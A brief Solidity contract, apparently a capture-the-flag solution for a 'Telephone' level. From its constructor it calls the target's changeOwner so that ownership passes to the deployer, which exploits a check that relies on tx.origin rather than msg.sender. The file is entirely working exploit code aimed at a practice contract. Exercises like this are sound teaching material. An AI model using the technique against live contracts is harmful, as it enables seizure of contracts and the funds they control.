// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../levels/Telephone.sol";

contract TelephoneAttack {
    Telephone instance;

    constructor(address _instance) {
        instance = Telephone(_instance);
        instance.changeOwner(msg.sender);
    }
}
